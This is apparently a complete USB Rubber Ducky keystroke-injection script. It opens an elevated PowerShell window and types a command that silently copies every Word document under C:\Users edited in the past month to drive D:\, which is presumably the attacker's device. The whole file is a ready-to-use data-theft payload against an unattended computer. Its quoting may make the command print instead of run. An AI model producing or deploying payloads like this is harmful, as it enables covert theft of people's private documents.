REM Ducky Script
DELAY 2000
GUI
DELAY 500
STRING powershell
CTRL SHIFT ENTER
DELAY 1500
STRING "$sourceFolder = 'C:\Users'; $destinationFolder = 'D:\'; $startDate = (Get-Date).AddMonths(-1); $endDate = Get-Date; Get-ChildItem -Path $sourceFolder -Recurse -Filter *.docx | Where-Object { $_.LastWriteTime -ge $startDate -and $_.LastWriteTime -le $endDate } | Copy-Item -Destination $destinationFolder -Container -Force"
ENTER
